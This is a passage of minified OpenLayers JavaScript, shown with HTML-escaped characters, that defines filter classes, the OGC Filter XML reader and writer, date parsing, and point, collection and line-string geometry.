OpenLayers.Filter.Logical({type:this.type,filters:a})},CLASS_NAME:"OpenLayers.Filter.Logical"});OpenLayers.Filter.Logical.AND="&amp;&amp;";OpenLayers.Filter.Logical.OR="||";OpenLayers.Filter.Logical.NOT="!";OpenLayers.Filter.Comparison=OpenLayers.Class(OpenLayers.Filter,{type:null,property:null,value:null,matchCase:!0,lowerBoundary:null,upperBoundary:null,initialize:function(a){OpenLayers.Filter.prototype.initialize.apply(this,[a]);this.type===OpenLayers.Filter.Comparison.LIKE&amp;&amp;void 0===a.matchCase&amp;&amp;(this.matchCase=null)},evaluate:function(a){a instanceof OpenLayers.Feature.Vector&amp;&amp;(a=a.attributes);var b=!1;a=a[this.property];switch(this.type){case OpenLayers.Filter.Comparison.EQUAL_TO:b=this.value; b=this.matchCase||"string"!=typeof a||"string"!=typeof b?a==b:a.toUpperCase()==b.toUpperCase();break;case OpenLayers.Filter.Comparison.NOT_EQUAL_TO:b=this.value;b=this.matchCase||"string"!=typeof a||"string"!=typeof b?a!=b:a.toUpperCase()!=b.toUpperCase();break;case OpenLayers.Filter.Comparison.LESS_THAN:b=a&lt;this.value;break;case OpenLayers.Filter.Comparison.GREATER_THAN:b=a>this.value;break;case OpenLayers.Filter.Comparison.LESS_THAN_OR_EQUAL_TO:b=a&lt;=this.value;break;case OpenLayers.Filter.Comparison.GREATER_THAN_OR_EQUAL_TO:b= a>=this.value;break;case OpenLayers.Filter.Comparison.BETWEEN:b=a>=this.lowerBoundary&amp;&amp;a&lt;=this.upperBoundary;break;case OpenLayers.Filter.Comparison.LIKE:b=RegExp(this.value,"gi").test(a);break;case OpenLayers.Filter.Comparison.IS_NULL:b=null===a}return b},value2regex:function(a,b,c){if("."==a)throw Error("'.' is an unsupported wildCard character for OpenLayers.Filter.Comparison");a=a?a:"*";b=b?b:".";this.value=this.value.replace(RegExp("\\"+(c?c:"!")+"(.|$)","g"),"\\$1");this.value=this.value.replace(RegExp("\\"+ b,"g"),".");this.value=this.value.replace(RegExp("\\"+a,"g"),".*");this.value=this.value.replace(RegExp("\\\\.\\*","g"),"\\"+a);return this.value=this.value.replace(RegExp("\\\\\\.","g"),"\\"+b)},regex2value:function(){var a=this.value,a=a.replace(/!/g,"!!"),a=a.replace(/(\\)?\\\./g,function(a,c){return c?a:"!."}),a=a.replace(/(\\)?\\\*/g,function(a,c){return c?a:"!*"}),a=a.replace(/\\\\/g,"\\");return a=a.replace(/\.\*/g,"*")},clone:function(){return OpenLayers.Util.extend(new OpenLayers.Filter.Comparison, this)},CLASS_NAME:"OpenLayers.Filter.Comparison"});OpenLayers.Filter.Comparison.EQUAL_TO="==";OpenLayers.Filter.Comparison.NOT_EQUAL_TO="!=";OpenLayers.Filter.Comparison.LESS_THAN="&lt;";OpenLayers.Filter.Comparison.GREATER_THAN=">";OpenLayers.Filter.Comparison.LESS_THAN_OR_EQUAL_TO="&lt;=";OpenLayers.Filter.Comparison.GREATER_THAN_OR_EQUAL_TO=">=";OpenLayers.Filter.Comparison.BETWEEN="..";OpenLayers.Filter.Comparison.LIKE="~";OpenLayers.Filter.Comparison.IS_NULL="NULL";OpenLayers.Format.Filter=OpenLayers.Class(OpenLayers.Format.XML.VersionedOGC,{defaultVersion:"1.0.0",CLASS_NAME:"OpenLayers.Format.Filter"});OpenLayers.Filter.Function=OpenLayers.Class(OpenLayers.Filter,{name:null,params:null,CLASS_NAME:"OpenLayers.Filter.Function"});OpenLayers.Date={dateRegEx:/^(?:(\d{4})(?:-(\d{2})(?:-(\d{2}))?)?)?(?:(?:T(\d{1,2}):(\d{2}):(\d{2}(?:\.\d+)?)(Z|(?:[+-]\d{1,2}(?::(\d{2}))?)))|Z)?$/,toISOString:function(){return"toISOString"in Date.prototype?function(a){return a.toISOString()}:function(a){return isNaN(a.getTime())?"Invalid Date":a.getUTCFullYear()+"-"+OpenLayers.Number.zeroPad(a.getUTCMonth()+1,2)+"-"+OpenLayers.Number.zeroPad(a.getUTCDate(),2)+"T"+OpenLayers.Number.zeroPad(a.getUTCHours(),2)+":"+OpenLayers.Number.zeroPad(a.getUTCMinutes(), 2)+":"+OpenLayers.Number.zeroPad(a.getUTCSeconds(),2)+"."+OpenLayers.Number.zeroPad(a.getUTCMilliseconds(),3)+"Z"}}(),parse:function(a){var b;if((a=a.match(this.dateRegEx))&amp;&amp;(a[1]||a[7])){b=parseInt(a[1],10)||0;var c=parseInt(a[2],10)-1||0,d=parseInt(a[3],10)||1;b=new Date(Date.UTC(b,c,d));if(c=a[7]){var d=parseInt(a[4],10),e=parseInt(a[5],10),f=parseFloat(a[6]),g=f|0,f=Math.round(1E3*(f-g));b.setUTCHours(d,e,g,f);"Z"!==c&amp;&amp;(c=parseInt(c,10),a=parseInt(a[8],10)||0,a=-1E3*(60*60*c+60*a),b=new Date(b.getTime()+ a))}}else b=new Date("invalid");return b}};OpenLayers.Format.Filter.v1=OpenLayers.Class(OpenLayers.Format.XML,{namespaces:{ogc:"http://www.opengis.net/ogc",gml:"http://www.opengis.net/gml",xlink:"http://www.w3.org/1999/xlink",xsi:"http://www.w3.org/2001/XMLSchema-instance"},defaultPrefix:"ogc",schemaLocation:null,initialize:function(a){OpenLayers.Format.XML.prototype.initialize.apply(this,[a])},read:function(a){var b={};this.readers.ogc.Filter.apply(this,[a,b]);return b.filter},readers:{ogc:{_expression:function(a){for(var b="",c=a.firstChild;c;c= c.nextSibling)switch(c.nodeType){case 1:a=this.readNode(c);a.property?b+="${"+a.property+"}":void 0!==a.value&amp;&amp;(b+=a.value);break;case 3:case 4:b+=c.nodeValue}return b},Filter:function(a,b){var c={fids:[],filters:[]};this.readChildNodes(a,c);0&lt;c.fids.length?b.filter=new OpenLayers.Filter.FeatureId({fids:c.fids}):0&lt;c.filters.length&amp;&amp;(b.filter=c.filters[0])},FeatureId:function(a,b){var c=a.getAttribute("fid");c&amp;&amp;b.fids.push(c)},And:function(a,b){var c=new OpenLayers.Filter.Logical({type:OpenLayers.Filter.Logical.AND}); this.readChildNodes(a,c);b.filters.push(c)},Or:function(a,b){var c=new OpenLayers.Filter.Logical({type:OpenLayers.Filter.Logical.OR});this.readChildNodes(a,c);b.filters.push(c)},Not:function(a,b){var c=new OpenLayers.Filter.Logical({type:OpenLayers.Filter.Logical.NOT});this.readChildNodes(a,c);b.filters.push(c)},PropertyIsLessThan:function(a,b){var c=new OpenLayers.Filter.Comparison({type:OpenLayers.Filter.Comparison.LESS_THAN});this.readChildNodes(a,c);b.filters.push(c)},PropertyIsGreaterThan:function(a, b){var c=new OpenLayers.Filter.Comparison({type:OpenLayers.Filter.Comparison.GREATER_THAN});this.readChildNodes(a,c);b.filters.push(c)},PropertyIsLessThanOrEqualTo:function(a,b){var c=new OpenLayers.Filter.Comparison({type:OpenLayers.Filter.Comparison.LESS_THAN_OR_EQUAL_TO});this.readChildNodes(a,c);b.filters.push(c)},PropertyIsGreaterThanOrEqualTo:function(a,b){var c=new OpenLayers.Filter.Comparison({type:OpenLayers.Filter.Comparison.GREATER_THAN_OR_EQUAL_TO});this.readChildNodes(a,c);b.filters.push(c)}, PropertyIsBetween:function(a,b){var c=new OpenLayers.Filter.Comparison({type:OpenLayers.Filter.Comparison.BETWEEN});this.readChildNodes(a,c);b.filters.push(c)},Literal:function(a,b){b.value=OpenLayers.String.numericIf(this.getChildValue(a),!0)},PropertyName:function(a,b){b.property=this.getChildValue(a)},LowerBoundary:function(a,b){b.lowerBoundary=OpenLayers.String.numericIf(this.readers.ogc._expression.call(this,a),!0)},UpperBoundary:function(a,b){b.upperBoundary=OpenLayers.String.numericIf(this.readers.ogc._expression.call(this, a),!0)},Intersects:function(a,b){this.readSpatial(a,b,OpenLayers.Filter.Spatial.INTERSECTS)},Within:function(a,b){this.readSpatial(a,b,OpenLayers.Filter.Spatial.WITHIN)},Contains:function(a,b){this.readSpatial(a,b,OpenLayers.Filter.Spatial.CONTAINS)},DWithin:function(a,b){this.readSpatial(a,b,OpenLayers.Filter.Spatial.DWITHIN)},Distance:function(a,b){b.distance=parseInt(this.getChildValue(a));b.distanceUnits=a.getAttribute("units")},Function:function(a,b){},PropertyIsNull:function(a,b){var c=new OpenLayers.Filter.Comparison({type:OpenLayers.Filter.Comparison.IS_NULL}); this.readChildNodes(a,c);b.filters.push(c)}}},readSpatial:function(a,b,c){c=new OpenLayers.Filter.Spatial({type:c});this.readChildNodes(a,c);c.value=c.components[0];delete c.components;b.filters.push(c)},encodeLiteral:function(a){a instanceof Date&amp;&amp;(a=OpenLayers.Date.toISOString(a));return a},writeOgcExpression:function(a,b){a instanceof OpenLayers.Filter.Function?this.writeNode("Function",a,b):this.writeNode("Literal",a,b);return b},write:function(a){return this.writers.ogc.Filter.apply(this,[a])}, writers:{ogc:{Filter:function(a){var b=this.createElementNSPlus("ogc:Filter");this.writeNode(this.getFilterType(a),a,b);return b},_featureIds:function(a){for(var b=this.createDocumentFragment(),c=0,d=a.fids.length;c&lt;d;++c)this.writeNode("ogc:FeatureId",a.fids[c],b);return b},FeatureId:function(a){return this.createElementNSPlus("ogc:FeatureId",{attributes:{fid:a}})},And:function(a){for(var b=this.createElementNSPlus("ogc:And"),c,d=0,e=a.filters.length;d&lt;e;++d)c=a.filters[d],this.writeNode(this.getFilterType(c), c,b);return b},Or:function(a){for(var b=this.createElementNSPlus("ogc:Or"),c,d=0,e=a.filters.length;d&lt;e;++d)c=a.filters[d],this.writeNode(this.getFilterType(c),c,b);return b},Not:function(a){var b=this.createElementNSPlus("ogc:Not");a=a.filters[0];this.writeNode(this.getFilterType(a),a,b);return b},PropertyIsLessThan:function(a){var b=this.createElementNSPlus("ogc:PropertyIsLessThan");this.writeNode("PropertyName",a,b);this.writeOgcExpression(a.value,b);return b},PropertyIsGreaterThan:function(a){var b= this.createElementNSPlus("ogc:PropertyIsGreaterThan");this.writeNode("PropertyName",a,b);this.writeOgcExpression(a.value,b);return b},PropertyIsLessThanOrEqualTo:function(a){var b=this.createElementNSPlus("ogc:PropertyIsLessThanOrEqualTo");this.writeNode("PropertyName",a,b);this.writeOgcExpression(a.value,b);return b},PropertyIsGreaterThanOrEqualTo:function(a){var b=this.createElementNSPlus("ogc:PropertyIsGreaterThanOrEqualTo");this.writeNode("PropertyName",a,b);this.writeOgcExpression(a.value,b); return b},PropertyIsBetween:function(a){var b=this.createElementNSPlus("ogc:PropertyIsBetween");this.writeNode("PropertyName",a,b);this.writeNode("LowerBoundary",a,b);this.writeNode("UpperBoundary",a,b);return b},PropertyName:function(a){return this.createElementNSPlus("ogc:PropertyName",{value:a.property})},Literal:function(a){return this.createElementNSPlus("ogc:Literal",{value:(this.encodeLiteral||OpenLayers.Format.Filter.v1.prototype.encodeLiteral)(a)})},LowerBoundary:function(a){var b=this.createElementNSPlus("ogc:LowerBoundary"); this.writeOgcExpression(a.lowerBoundary,b);return b},UpperBoundary:function(a){var b=this.createElementNSPlus("ogc:UpperBoundary");this.writeNode("Literal",a.upperBoundary,b);return b},INTERSECTS:function(a){return this.writeSpatial(a,"Intersects")},WITHIN:function(a){return this.writeSpatial(a,"Within")},CONTAINS:function(a){return this.writeSpatial(a,"Contains")},DWITHIN:function(a){var b=this.writeSpatial(a,"DWithin");this.writeNode("Distance",a,b);return b},Distance:function(a){return this.createElementNSPlus("ogc:Distance", {attributes:{units:a.distanceUnits},value:a.distance})},Function:function(a){var b=this.createElementNSPlus("ogc:Function",{attributes:{name:a.name}});a=a.params;for(var c=0,d=a.length;c&lt;d;c++)this.writeOgcExpression(a[c],b);return b},PropertyIsNull:function(a){var b=this.createElementNSPlus("ogc:PropertyIsNull");this.writeNode("PropertyName",a,b);return b}}},getFilterType:function(a){var b=this.filterMap[a.type];if(!b)throw"Filter writing not supported for rule type: "+a.type;return b},filterMap:{"&amp;&amp;":"And", "||":"Or","!":"Not","==":"PropertyIsEqualTo","!=":"PropertyIsNotEqualTo","&lt;":"PropertyIsLessThan",">":"PropertyIsGreaterThan","&lt;=":"PropertyIsLessThanOrEqualTo",">=":"PropertyIsGreaterThanOrEqualTo","..":"PropertyIsBetween","~":"PropertyIsLike",NULL:"PropertyIsNull",BBOX:"BBOX",DWITHIN:"DWITHIN",WITHIN:"WITHIN",CONTAINS:"CONTAINS",INTERSECTS:"INTERSECTS",FID:"_featureIds"},CLASS_NAME:"OpenLayers.Format.Filter.v1"});OpenLayers.Geometry=OpenLayers.Class({id:null,parent:null,bounds:null,initialize:function(){this.id=OpenLayers.Util.createUniqueID(this.CLASS_NAME+"_")},destroy:function(){this.bounds=this.id=null},clone:function(){return new OpenLayers.Geometry},setBounds:function(a){a&amp;&amp;(this.bounds=a.clone())},clearBounds:function(){this.bounds=null;this.parent&amp;&amp;this.parent.clearBounds()},extendBounds:function(a){this.getBounds()?this.bounds.extend(a):this.setBounds(a)},getBounds:function(){null==this.bounds&amp;&amp;this.calculateBounds(); return this.bounds},calculateBounds:function(){},distanceTo:function(a,b){},getVertices:function(a){},atPoint:function(a,b,c){var d=!1;null!=this.getBounds()&amp;&amp;null!=a&amp;&amp;(b=null!=b?b:0,c=null!=c?c:0,d=(new OpenLayers.Bounds(this.bounds.left-b,this.bounds.bottom-c,this.bounds.right+b,this.bounds.top+c)).containsLonLat(a));return d},getLength:function(){return 0},getArea:function(){return 0},getCentroid:function(){return null},toString:function(){return OpenLayers.Format&amp;&amp;OpenLayers.Format.WKT?OpenLayers.Format.WKT.prototype.write(new OpenLayers.Feature.Vector(this)): Object.prototype.toString.call(this)},CLASS_NAME:"OpenLayers.Geometry"});OpenLayers.Geometry.fromWKT=function(a){var b;if(OpenLayers.Format&amp;&amp;OpenLayers.Format.WKT){var c=OpenLayers.Geometry.fromWKT.format;c||(c=new OpenLayers.Format.WKT,OpenLayers.Geometry.fromWKT.format=c);a=c.read(a);if(a instanceof OpenLayers.Feature.Vector)b=a.geometry;else if(OpenLayers.Util.isArray(a)){b=a.length;for(var c=Array(b),d=0;d&lt;b;++d)c[d]=a[d].geometry;b=new OpenLayers.Geometry.Collection(c)}}return b}; OpenLayers.Geometry.segmentsIntersect=function(a,b,c){var d=c&amp;&amp;c.point;c=c&amp;&amp;c.tolerance;var e=!1,f=a.x1-b.x1,g=a.y1-b.y1,h=a.x2-a.x1,k=a.y2-a.y1,l=b.y2-b.y1,m=b.x2-b.x1,n=l*h-m*k,l=m*g-l*f,g=h*g-k*f;0==n?0==l&amp;&amp;0==g&amp;&amp;(e=!0):(f=l/n,n=g/n,0&lt;=f&amp;&amp;(1>=f&amp;&amp;0&lt;=n&amp;&amp;1>=n)&amp;&amp;(d?(h=a.x1+f*h,n=a.y1+f*k,e=new OpenLayers.Geometry.Point(h,n)):e=!0));if(c)if(e){if(d)a:for(a=[a,b],b=0;2>b;++b)for(f=a[b],k=1;3>k;++k)if(h=f["x"+k],n=f["y"+k],d=Math.sqrt(Math.pow(h-e.x,2)+Math.pow(n-e.y,2)),d&lt;c){e.x=h;e.y=n;break a}}else a:for(a= [a,b],b=0;2>b;++b)for(h=a[b],n=a[(b+1)%2],k=1;3>k;++k)if(f={x:h["x"+k],y:h["y"+k]},g=OpenLayers.Geometry.distanceToSegment(f,n),g.distance&lt;c){e=d?new OpenLayers.Geometry.Point(f.x,f.y):!0;break a}return e};OpenLayers.Geometry.distanceToSegment=function(a,b){var c=OpenLayers.Geometry.distanceSquaredToSegment(a,b);c.distance=Math.sqrt(c.distance);return c}; OpenLayers.Geometry.distanceSquaredToSegment=function(a,b){var c=a.x,d=a.y,e=b.x1,f=b.y1,g=b.x2,h=b.y2,k=g-e,l=h-f,m=(k*(c-e)+l*(d-f))/(Math.pow(k,2)+Math.pow(l,2));0>=m||(1&lt;=m?(e=g,f=h):(e+=m*k,f+=m*l));return{distance:Math.pow(e-c,2)+Math.pow(f-d,2),x:e,y:f,along:m}};OpenLayers.Geometry.Point=OpenLayers.Class(OpenLayers.Geometry,{x:null,y:null,initialize:function(a,b){OpenLayers.Geometry.prototype.initialize.apply(this,arguments);this.x=parseFloat(a);this.y=parseFloat(b)},clone:function(a){null==a&amp;&amp;(a=new OpenLayers.Geometry.Point(this.x,this.y));OpenLayers.Util.applyDefaults(a,this);return a},calculateBounds:function(){this.bounds=new OpenLayers.Bounds(this.x,this.y,this.x,this.y)},distanceTo:function(a,b){var c=!(b&amp;&amp;!1===b.edge)&amp;&amp;b&amp;&amp;b.details,d,e,f,g,h;a instanceof OpenLayers.Geometry.Point?(e=this.x,f=this.y,g=a.x,h=a.y,d=Math.sqrt(Math.pow(e-g,2)+Math.pow(f-h,2)),d=c?{x0:e,y0:f,x1:g,y1:h,distance:d}:d):(d=a.distanceTo(this,b),c&amp;&amp;(d={x0:d.x1,y0:d.y1,x1:d.x0,y1:d.y0,distance:d.distance}));return d},equals:function(a){var b=!1;null!=a&amp;&amp;(b=this.x==a.x&amp;&amp;this.y==a.y||isNaN(this.x)&amp;&amp;isNaN(this.y)&amp;&amp;isNaN(a.x)&amp;&amp;isNaN(a.y));return b},toShortString:function(){return this.x+", "+this.y},move:function(a,b){this.x+=a;this.y+=b;this.clearBounds()},rotate:function(a,b){a*= Math.PI/180;var c=this.distanceTo(b),d=a+Math.atan2(this.y-b.y,this.x-b.x);this.x=b.x+c*Math.cos(d);this.y=b.y+c*Math.sin(d);this.clearBounds()},getCentroid:function(){return new OpenLayers.Geometry.Point(this.x,this.y)},resize:function(a,b,c){this.x=b.x+a*(void 0==c?1:c)*(this.x-b.x);this.y=b.y+a*(this.y-b.y);this.clearBounds();return this},intersects:function(a){var b=!1;return b="OpenLayers.Geometry.Point"==a.CLASS_NAME?this.equals(a):a.intersects(this)},transform:function(a,b){a&amp;&amp;b&amp;&amp;(OpenLayers.Projection.transform(this, a,b),this.bounds=null);return this},getVertices:function(a){return[this]},CLASS_NAME:"OpenLayers.Geometry.Point"});OpenLayers.Geometry.Collection=OpenLayers.Class(OpenLayers.Geometry,{components:null,componentTypes:null,initialize:function(a){OpenLayers.Geometry.prototype.initialize.apply(this,arguments);this.components=[];null!=a&amp;&amp;this.addComponents(a)},destroy:function(){this.components.length=0;this.components=null;OpenLayers.Geometry.prototype.destroy.apply(this,arguments)},clone:function(){for(var a=eval("new "+this.CLASS_NAME+"()"),b=0,c=this.components.length;b&lt;c;b++)a.addComponent(this.components[b].clone()); OpenLayers.Util.applyDefaults(a,this);return a},getComponentsString:function(){for(var a=[],b=0,c=this.components.length;b&lt;c;b++)a.push(this.components[b].toShortString());return a.join(",")},calculateBounds:function(){this.bounds=null;var a=new OpenLayers.Bounds,b=this.components;if(b)for(var c=0,d=b.length;c&lt;d;c++)a.extend(b[c].getBounds());null!=a.left&amp;&amp;(null!=a.bottom&amp;&amp;null!=a.right&amp;&amp;null!=a.top)&amp;&amp;this.setBounds(a)},addComponents:function(a){OpenLayers.Util.isArray(a)||(a=[a]);for(var b=0,c=a.length;b&lt; c;b++)this.addComponent(a[b])},addComponent:function(a,b){var c=!1;if(a&amp;&amp;(null==this.componentTypes||-1&lt;OpenLayers.Util.indexOf(this.componentTypes,a.CLASS_NAME))){if(null!=b&amp;&amp;b&lt;this.components.length){var c=this.components.slice(0,b),d=this.components.slice(b,this.components.length);c.push(a);this.components=c.concat(d)}else this.components.push(a);a.parent=this;this.clearBounds();c=!0}return c},removeComponents:function(a){var b=!1;OpenLayers.Util.isArray(a)||(a=[a]);for(var c=a.length-1;0&lt;=c;--c)b= this.removeComponent(a[c])||b;return b},removeComponent:function(a){OpenLayers.Util.removeItem(this.components,a);this.clearBounds();return!0},getLength:function(){for(var a=0,b=0,c=this.components.length;b&lt;c;b++)a+=this.components[b].getLength();return a},getArea:function(){for(var a=0,b=0,c=this.components.length;b&lt;c;b++)a+=this.components[b].getArea();return a},getGeodesicArea:function(a){for(var b=0,c=0,d=this.components.length;c&lt;d;c++)b+=this.components[c].getGeodesicArea(a);return b},getCentroid:function(a){if(!a)return this.components.length&amp;&amp; this.components[0].getCentroid();a=this.components.length;if(!a)return!1;for(var b=[],c=[],d=0,e=Number.MAX_VALUE,f,g=0;g&lt;a;++g){f=this.components[g];var h=f.getArea();f=f.getCentroid(!0);isNaN(h)||(isNaN(f.x)||isNaN(f.y))||(b.push(h),d+=h,e=h&lt;e&amp;&amp;0&lt;h?h:e,c.push(f))}a=b.length;if(0===d){for(g=0;g&lt;a;++g)b[g]=1;d=b.length}else{for(g=0;g&lt;a;++g)b[g]/=e;d/=e}for(var k=e=0,g=0;g&lt;a;++g)f=c[g],h=b[g],e+=f.x*h,k+=f.y*h;return new OpenLayers.Geometry.Point(e/d,k/d)},getGeodesicLength:function(a){for(var b=0, c=0,d=this.components.length;c&lt;d;c++)b+=this.components[c].getGeodesicLength(a);return b},move:function(a,b){for(var c=0,d=this.components.length;c&lt;d;c++)this.components[c].move(a,b)},rotate:function(a,b){for(var c=0,d=this.components.length;c&lt;d;++c)this.components[c].rotate(a,b)},resize:function(a,b,c){for(var d=0;d&lt;this.components.length;++d)this.components[d].resize(a,b,c);return this},distanceTo:function(a,b){for(var c=!(b&amp;&amp;!1===b.edge)&amp;&amp;b&amp;&amp;b.details,d,e,f,g=Number.POSITIVE_INFINITY,h=0,k=this.components.length;h&lt; k&amp;&amp;!(d=this.components[h].distanceTo(a,b),f=c?d.distance:d,f&lt;g&amp;&amp;(g=f,e=d,0==g));++h);return e},equals:function(a){var b=!0;if(a&amp;&amp;a.CLASS_NAME&amp;&amp;this.CLASS_NAME==a.CLASS_NAME)if(OpenLayers.Util.isArray(a.components)&amp;&amp;a.components.length==this.components.length)for(var c=0,d=this.components.length;c&lt;d;++c){if(!this.components[c].equals(a.components[c])){b=!1;break}}else b=!1;else b=!1;return b},transform:function(a,b){if(a&amp;&amp;b){for(var c=0,d=this.components.length;c&lt;d;c++)this.components[c].transform(a, b);this.bounds=null}return this},intersects:function(a){for(var b=!1,c=0,d=this.components.length;c&lt;d&amp;&amp;!(b=a.intersects(this.components[c]));++c);return b},getVertices:function(a){for(var b=[],c=0,d=this.components.length;c&lt;d;++c)Array.prototype.push.apply(b,this.components[c].getVertices(a));return b},CLASS_NAME:"OpenLayers.Geometry.Collection"});OpenLayers.Geometry.MultiPoint=OpenLayers.Class(OpenLayers.Geometry.Collection,{componentTypes:["OpenLayers.Geometry.Point"],addPoint:function(a,b){this.addComponent(a,b)},removePoint:function(a){this.removeComponent(a)},CLASS_NAME:"OpenLayers.Geometry.MultiPoint"});OpenLayers.Geometry.Curve=OpenLayers.Class(OpenLayers.Geometry.MultiPoint,{componentTypes:["OpenLayers.Geometry.Point"],getLength:function(){var a=0;if(this.components&amp;&amp;1&lt;this.components.length)for(var b=1,c=this.components.length;b&lt;c;b++)a+=this.components[b-1].distanceTo(this.components[b]);return a},getGeodesicLength:function(a){var b=this;if(a){var c=new OpenLayers.Projection("EPSG:4326");c.equals(a)||(b=this.clone().transform(a,c))}a=0;if(b.components&amp;&amp;1&lt;b.components.length)for(var d,e=1,f=b.components.length;e&lt; f;e++)c=b.components[e-1],d=b.components[e],a+=OpenLayers.Util.distVincenty({lon:c.x,lat:c.y},{lon:d.x,lat:d.y});return 1E3*a},CLASS_NAME:"OpenLayers.Geometry.Curve"});OpenLayers.Geometry.LineString=OpenLayers.Class(OpenLayers.Geometry.Curve,{removeComponent:function(a){var b=this.components&amp;&amp;2&lt;this.components.length;b&amp;&amp;OpenLayers.Geometry.Collection.prototype.removeComponent.apply(this,arguments);return b},intersects:function(a){var b=!1,c=a.CLASS_NAME;if("OpenLayers.Geometry.LineString"==c||"OpenLayers.Geometry.LinearRing"==c||"OpenLayers.Geometry.Point"==c){var d=this.getSortedSegments();a="OpenLayers.Geometry.Point"==c?[{x1:a.x,y1:a.y,x2:a.x,y2:a.y}]:a.getSortedSegments(); var e,f,g,h,k,l,m,n=0,p=d.length;a:for(;n&lt;p;++n){c=d[n];e=c.x1;f=c.x2;g=c.y1;h=c.y2;var q=0,r=a.length;for(;q&lt;r;++q){k=a[q];if(k.x1>f)break;if(!(k.x2&lt;e||(l=k.y1,m=k.y2,Math.min(l,m)>Math.max(g,h)||Math.max(l,m)&lt;Math.min(g,h)||!OpenLayers.Geometry.segmentsIntersect(c,k)))){b=!0;break a}}}}else b=a.intersects(this);return b},getSortedSegments:function(){for(var a=this.components.length-1,b=Array(a),c,d,e=0;e&lt;a;++e)c=this.components[e],d=this.components[e+1],b[e]=c.x&lt;d.x?{x1:c.x,y1:c.y,x2:d.x,y2:d.y}: {x1:d.x,y1:d.y,x2:c.x,y2:c.y};return b.sort(function(a,b){return a.x1-b.x1})},splitWithSegment:function(a,b){for(var c=!(b&amp;&amp;!1===b.edge),d=b&amp;&amp;b.tolerance,e=[],f=this.getVertices(),g=[],h=[],k=!1,l,m,n,p={point:!0,tolerance:d},q=null,r=0,s=f.length-2;r&lt;=s;++r)if(d=f[r],g.push(d.clone()),l=f[r+1],m={x1:d.x,y1:d.y,x2:l.x,y2:l.y},m=OpenLayers.Geometry.segmentsIntersect(a,m,p),m instanceof OpenLayers.Geometry.Point&amp;&amp;((n=m.x===a.x1&amp;&amp;m.y===a.y1||m.x===a.x2&amp;&amp;m.y===a.y2||m.equals(d)||m.equals(l)?!0:!1)||c))m.equals(h[h.length- 1])||h.push(m.clone()),0===r&amp;&amp;m.equals(d)||m.equals(l)||(k=!0,m.equals(d)||g.push(m),e.push(new OpenLayers.Geometry.LineString(g)),g=[m.clone()]);k&amp;&amp;(g.push(l.clone()),e.push(new OpenLayers.Geometry.LineString(g)));if(0&lt;h.length)var t=a.x1&lt;a.x2?1:-1,u=a.y1&lt;a.y2?1:-1,q={lines:e,points:h.sort(function(a,b){return t*a.x-t*b.x||u*a.y-u*b.y})};return q},split:function(a,b){var c=null,d=b&amp;&amp;b.mutual,e,f,g,h;if(a instanceof OpenLayers.Geometry.LineString){var k=this.getVertices(),l,m,n,p,q,r=[];g=[];for(var s= 0,t=k.length-2;s&lt;=t;++s){l=k[s];m=k[s+1];n={x1:l.x,y1:l.y,x2:m.x,y2:m.y};h=h||[a];d&amp;&amp;r.push(l.clone());for(var u=0;u&lt;h.length;++u)if(p=h[u].splitWithSegment(n,b))if(q=p.lines,0&lt;q.length&amp;&amp;(q.unshift(u,1),Array.prototype.splice.apply(h,q),u+=q.length-2),d)for(var v=0,w=p.points.length;v&lt;w;++v)q=p.points[v],q.equals(l)||(r.push(q),g.push(new OpenLayers.Geometry.LineString(r)),r=q.equals(m)?[]:[q.clone()])}d&amp;&amp;(0&lt;g.length&amp;&amp;0&lt;r.length)&amp;&amp;(r.push(m.clone()),g.push(new OpenLayers.Geometry.LineString(r)))}else c= a.splitWith(this,b);h&amp;&amp;1&lt;h.length?f=!0:h=[];g&amp;&amp;1&lt;g.length?e=!0:g=[];if(f||e)c=d?[g,h]:h;return c},splitWith:function(a,b){return a.split(this,b)},getVertices:function(a){return!0===a?[this.components[0],this.components[this.components.length-1]]:!1===a?this.components.slice(1,this.components.length-1):this.components.slice()},distanceTo:function(a,b){var c=!(b&amp;&amp;!1===b.edge)&amp;&amp;b&amp;&amp;b.details,d,e={},f=Number.POSITIVE_INFINITY;if(a instanceof OpenLayers.Geometry.Point){for(var g=this.getSortedSegments(), h=a.x,k=a.y,l,m=0,n=g.length;m&lt;n;++m)if(l=g[m],d=OpenLayers.Geometry.distanceToSegment(a,l),d.distance&lt;f){if(f=d.distance,e=d,0===f)break}else if(l.x2>h&amp;&amp;(k>l.y1&amp;&amp;k&lt;l.y2||k&lt;l.y1&amp;&amp;k>l.y2))break;e=c?{distance:e.distance,x0:e.x,y0:e.y,x1:h,y1:k}:e.distance}else if(a instanceof OpenLayers.Geometry.LineString){var g=this.getSortedSegments(),h=a.getSortedSegments(),p,q,r=h.length,s={point:!0},m=0,n=g.length;a:for(;m&lt;n;++m){k=g[m];l=k.x1;q=k.y1;for(var t=0;t&lt;r;++t)if(d=h[t],p=OpenLayers.Geometry.segmentsIntersect(k, d,s)){f=0;e={distance:0,x0:p.x,y0:p.y,x1:p.x,y1:p.y};break a}else d=OpenLayers.Geometry.distanceToSegment({x:l,y:q},d),d.distance&lt;f&amp;&amp;(f=d.distance,e={distance:f,x0:l,y0:q,x1:d.x,y1:d.y})}c||(e=e.distance);0!==f&amp;&amp;k&amp;&amp;(d=a.distanceTo(new OpenLayers.Geometry.Point(k.x2,k.y2),b),m=c?d.distance:d,m&lt;f&amp;&amp;(e=c?{distance:f,x0:d.x1,y0:d.y1,x1:d.x0,y1:d.y0}:m))}else e=a.distanceTo(this,b),c&amp;&amp;(e={distance:e.distance,x0:e.x1,y0:e.y1,x1:e.x0,y1:e.y0});return e},simplify:function(a){if(this&amp;&amp;null!==this){var b=this.getVertices(); if(3>b.length)return this;var c=function(a,b,d,k){for(var l=0,m=0,n=b,p;n&lt;d;n++){p=a[b];var q=a[d],r=a[n],r=Math.abs(0.5*(p.x*q.y+q.x*r.y+r.x*p.y-q.x*p.y-r.x*q.y-p.x*r.y));p=Math.sqrt(Math.pow(p.x-q.x,2)+Math.pow(p.y-q.y,2));p=2*(r/p);p>l&amp;&amp;(l=p,m=n)}l>k&amp;&amp;m!=b&amp;&amp;(e.push(m),c(a,b,m,k),c(a,m,d,k))},d=b.length-1,e=[];e.push(0);for(e.push(d);b[0].equals(b[d]);)d--,e.push(d);c(b,0,d,a);a=[];e.sort(function(a,b){return a-b});for(d=0;d&lt;e.length;d++)a.push(b[e[d]]);return new OpenLayers.Geometry.LineString(a)}return this}, CLASS_NAME:"OpenLayers.Geometry.LineString"});OpenLayers.Geometry.MultiLineString=OpenLayers.Class(OpenLayers.Geometry.Collection,{componentTypes:["OpenLayers.Geometry.LineString"],split:function(a,b){for(var 